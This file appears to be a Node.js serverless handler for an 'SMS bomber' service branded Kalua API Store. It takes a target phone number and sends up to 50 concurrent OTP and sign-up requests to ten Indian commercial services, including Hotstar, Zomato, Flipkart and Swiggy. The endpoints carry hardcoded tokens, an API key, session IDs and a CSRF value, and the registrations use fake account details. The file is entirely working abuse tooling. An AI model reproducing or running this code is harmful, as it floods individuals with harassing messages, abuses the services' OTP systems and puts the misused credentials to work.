const axios = require('axios');

// ============================================================
// 🔥 3D PREMIUM ULTRA SMS ENDPOINTS - KALUA API STORE
// ============================================================
const ENDPOINTS = [
  // Hotstar
  {
    method: 'PUT',
    url: 'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
    headers: {
      'Host': 'api.hotstar.com',
      'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OTvejA=",
      'user-agent': 'Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      'content-type': 'application/json',
      'x-hs-platform': 'PCTV',
      'x-country-code': 'IN',
      'accept': '*/*',
      'origin': 'https://www.hotstar.com',
      'referer': 'https://www.hotstar.com/in/subscribe/sign-in'
    },
    data: (number) => ({ phone_number: number, country_prefix: '91' })
  },
  // AltBalaji
  {
    method: 'POST',
    url: 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
    headers: {
      'Host': 'api.cloud.altbalaji.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36',
      'X-API-KEY': 'MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
      'Content-Type': 'application/json',
      'Origin': 'https://www.altbalaji.com'
    },
    data: (number) => ({ phone_number: number, country_code: '91', platform: 'web', exp: 1900000000000 })
  },
  // SonyLIV
  {
    method: 'POST',
    url: 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
    headers: {
      'Host': 'apiv2.sonyliv.com',
      'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
      'user-agent': 'Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36',
      'content-type': 'application/json',
      'origin': 'https://www.sonyliv.com'
    },
    data: (number) => ({ channelPartnerID: 'MSMIND', mobileNumber: number, country: 'IN', timestamp: new Date().toISOString() })
  },
  // Medplus
  {
    method: 'POST',
    url: 'https://mobile.medplusindia.com/mobilemvc/profile/register.mbl',
    headers: {
      'Host': 'mobile.medplusindia.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.medplusmart.com'
    },
    data: (number) => `recieveUpdates=1&firstName=Kalua&lastName=Store&emailId=kaluaapi@gmail.com&password=Secure@123&confirmpwd=Secure@123&mobileNumber=${number}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027`
  },
  // Apollo
  {
    method: 'POST',
    url: 'https://webapi.apollo247.com/',
    headers: {
      'Host': 'webapi.apollo247.com',
      'Content-Type': 'application/json',
      'Origin': 'https://www.apollo247.com'
    },
    data: (number) => ({
      operationName: 'Login',
      variables: { mobileNumber: `+91${number}`, loginType: 'PATIENT' },
      query: `query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n`
    })
  },
  // Zomato
  {
    method: 'POST',
    url: 'https://www.zomato.com/webroutes/auth/login',
    headers: {
      'Host': 'www.zomato.com',
      'Content-Type': 'application/json',
      'Origin': 'https://www.zomato.com'
    },
    data: (number) => ({ country_id: 1, phone: number, verification_type: 'sms', method: 'phone' })
  },
  // Flipkart
  {
    method: 'POST',
    url: 'https://1.rome.api.flipkart.com/1/action/view',
    headers: {
      'Host': '1.rome.api.flipkart.com',
      'content-type': 'application/json',
      'Referer': 'https://www.flipkart.com/'
    },
    data: (number) => ({
      actionRequestContext: {
        type: 'LOGIN_IDENTITY_VERIFY',
        loginIdPrefix: '+91',
        loginId: number,
        loginType: 'MOBILE',
        verificationType: 'OTP',
        screenName: 'LOGIN_V4_MOBILE',
        sourceContext: 'DEFAULT'
      }
    })
  },
  // Swiggy
  {
    method: 'POST',
    url: 'https://www.swiggy.com/mapi/auth/signup',
    headers: {
      'Host': 'www.swiggy.com',
      'Origin': 'https://www.swiggy.com',
      'Content-Type': 'application/json'
    },
    data: (number) => ({ name: 'Kalua Store', email: 'kaluaapi@gmail.com', password: 'SecurePassword@123', mobile: number, _csrf: 'jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk' })
  },
  // BookMyShow
  {
    method: 'POST',
    url: 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
    headers: {
      'Host': 'in.bookmyshow.com',
      'Content-Type': 'application/json',
      'Origin': 'https://in.bookmyshow.com'
    },
    data: (number) => ({ channel: 'phone', subChannel: 'sms', details: { phone: number, origin: 'https://in.bookmyshow.com' } })
  },
  // BigBasket
  {
    method: 'POST',
    url: 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
    headers: {
      'Host': 'www.bigbasket.com',
      'Content-Type': 'application/json',
      'Origin': 'https://www.bigbasket.com'
    },
    data: (number) => ({ identifier: number })
  }
];

// ============================================================
// 💎 PROFESSIONAL VERCEL HANDLER (BRANDED: KALUA API STORE)
// ============================================================
module.exports = async (req, res) => {
  // CORS Headers for 3D Professional UI integration
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Method not allowed. Please use POST request.'
    });
  }

  const { number, count = 1 } = req.body;

  if (!number) {
    return res.status(400).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Missing target "number" parameter.'
    });
  }

  const cleanNumber = number.replace(/\D/g, '');
  if (cleanNumber.length < 10 || cleanNumber.length > 15) {
    return res.status(400).json({
      creator: "KaluaApiAdmin",
      channel: "@KaluaApiStore",
      error: 'Invalid phone number format. Must be 10 to 15 digits.'
    });
  }

  const totalRequests = Math.min(Number(count) || 1, 30); // Optimized limit for stability
  let successCount = 0;
  let failedCount = 0;
  const details = [];

  // Fire requests concurrently with high stability
  const tasks = [];
  for (let i = 0; i < totalRequests; i++) {
    for (const endpoint of ENDPOINTS) {
      tasks.push(sendRequest(endpoint, cleanNumber));
    }
  }

  const limitedTasks = tasks.slice(0, 50); // Performance cap
  const responses = await Promise.allSettled(limitedTasks);

  for (const r of responses) {
    if (r.status === 'fulfilled') {
      successCount++;
      details.push({ status: 'success', url: r.value.url });
    } else {
      failedCount++;
      details.push({ status: 'failed', error: r.reason });
    }
  }

  return res.status(200).json({
    status: 'True',
    brand: 'KaluaApiStore',
    admin: 'KaluaApiAdmin',
    target: cleanNumber,
    total_attempts: limitedTasks.length,
    success: successCount,
    failed: failedCount,
    message: '🚀 Bomber API executed successfully with high-performance routing!'
  });
};

// ============================================================
// ⚡ ASYNC REQUEST EXECUTOR HELPER
// ============================================================
async function sendRequest(endpoint, number) {
  try {
    let url = endpoint.url;
    if (typeof url === 'function') url = url(number);

    let data = endpoint.data;
    if (typeof data === 'function') data = data(number);

    const config = {
      method: endpoint.method || 'POST',
      url,
      headers: endpoint.headers || {},
      timeout: 4000,
    };

    if (config.method !== 'GET' && data) {
      config.data = data;
    }

    const response = await axios(config);
    return { url, status: response.status };
  } catch (error) {
    throw { url: endpoint.url, error: error.message };
  }
}
